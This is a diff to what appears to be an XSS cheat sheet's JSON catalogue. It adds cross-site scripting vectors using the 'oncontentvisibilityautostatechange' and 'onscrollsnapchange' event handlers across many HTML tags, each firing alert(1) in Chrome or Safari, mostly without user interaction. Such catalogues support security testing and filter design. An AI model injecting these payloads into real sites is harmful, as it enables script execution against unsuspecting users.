@@ -6210,12 +6210,23 @@
       }
     ]
   },
-  "oncontentvisibilityautostatechange": {
+  "oncontentvisibilityautostatechange(hidden)": {
     "description": "Fires in a hidden input when content-visibility is set to auto",
     "tags": [
       {
         "tag": "input",
         "code": "<input type=hidden oncontentvisibilityautostatechange=alert(1) style=content-visibility:auto>",
+        "browsers": ["chrome"],
+        "interaction": false
+      }
+    ]
+  },
+  "oncontentvisibilityautostatechange": {
+    "description": "Fires on all tags when content-visibility is set to auto",
+    "tags": [
+      {
+        "tag": "*",
+        "code": "<* oncontentvisibilityautostatechange=alert(1) style=display:block;content-visibility:auto>",
         "browsers": ["chrome"],
         "interaction": false
       }
@@ -6240,6 +6251,95 @@
         "code": "<video controls src=validvideo.mp4 onwebkitfullscreenchange=alert(1)>",
         "browsers": ["safari"],
         "interaction": true
+      }
+    ]
+  },
+  "onscrollsnapchange": {
+    "description": "Fires at the end of a scrolling operation",
+    "tags": [
+      {
+        "tag": "aside",
+        "code": "<aside onscrollsnapchange=alert(1) style=overflow-y:hidden;scroll-snap-type:x><div style=scroll-snap-align:center>1337</div></aside>",
+        "browsers": ["chrome"],
+        "interaction": false
+      },
+      {
+        "tag": "blockquote",
+        "code": "<blockquote onscrollsnapchange=alert(1) style=overflow-y:hidden;scroll-snap-type:x><div style=scroll-snap-align:center>1337</div></blockquote>",
+        "browsers": ["chrome"],
+        "interaction": false
+      },
+      {
+        "tag": "dd",
+        "code": "<dd onscrollsnapchange=alert(1) style=overflow-y:hidden;scroll-snap-type:x><div style=scroll-snap-align:center>1337</div></dd>",
+        "browsers": ["chrome"],
+        "interaction": false
+      },
+      {
+        "tag": "dt",
+        "code": "<dt onscrollsnapchange=alert(1) style=overflow-y:hidden;scroll-snap-type:x><div style=scroll-snap-align:center>1337</div></dt>",
+        "browsers": ["chrome"],
+        "interaction": false
+      },
+      {
+        "tag": "fieldset",
+        "code": "<fieldset onscrollsnapchange=alert(1) style=overflow-y:hidden;scroll-snap-type:x><div style=scroll-snap-align:center>1337</div></fieldset>",
+        "browsers": ["chrome"],
+        "interaction": false
+      },
+      {
+        "tag": "figcaption",
+        "code": "<figcaption onscrollsnapchange=alert(1) style=overflow-y:hidden;scroll-snap-type:x><div style=scroll-snap-align:center>1337</div></figcaption>",
+        "browsers": ["chrome"],
+        "interaction": false
+      },
+      {
+        "tag": "footer",
+        "code": "<footer onscrollsnapchange=alert(1) style=overflow-y:hidden;scroll-snap-type:x><div style=scroll-snap-align:center>1337</div></footer>",
+        "browsers": ["chrome"],
+        "interaction": false
+      },
+      {
+        "tag": "form",
+        "code": "<form onscrollsnapchange=alert(1) style=overflow-y:hidden;scroll-snap-type:x><div style=scroll-snap-align:center>1337</div></form>",
+        "browsers": ["chrome"],
+        "interaction": false
+      },
+      {
+        "tag": "header",
+        "code": "<header onscrollsnapchange=alert(1) style=overflow-y:hidden;scroll-snap-type:x><div style=scroll-snap-align:center>1337</div></header>",
+        "browsers": ["chrome"],
+        "interaction": false
+      },
+      {
+        "tag": "article",
+        "code": "<article onscrollsnapchange=alert(1) style=overflow-y:hidden;scroll-snap-type:x><div style=scroll-snap-align:center>1337</div></article>",
+        "browsers": ["chrome"],
+        "interaction": false
+      },
+      {
+        "tag": "address",
+        "code": "<address onscrollsnapchange=alert(1) style=overflow-y:hidden;scroll-snap-type:x><div style=scroll-snap-align:center>1337</div></address>",
+        "browsers": ["chrome"],
+        "interaction": false
+      },
+      {
+        "tag": "div",
+        "code": "<div onscrollsnapchange=alert(1) style=overflow-y:hidden;scroll-snap-type:x><div style=scroll-snap-align:center>1337</div></div>",
+        "browsers": ["chrome"],
+        "interaction": false
+      },
+      {
+        "tag": "main",
+        "code": "<main onscrollsnapchange=alert(1) style=overflow-y:hidden;scroll-snap-type:x><div style=scroll-snap-align:center>1337</div></main>",
+        "browsers": ["chrome"],
+        "interaction": false
+      },
+      {
+        "tag": "section",
+        "code": "<section onscrollsnapchange=alert(1) style=overflow-y:hidden;scroll-snap-type:x><div style=scroll-snap-align:center>1337</div></section>",
+        "browsers": ["chrome"],
+        "interaction": false
       }
     ]
   }
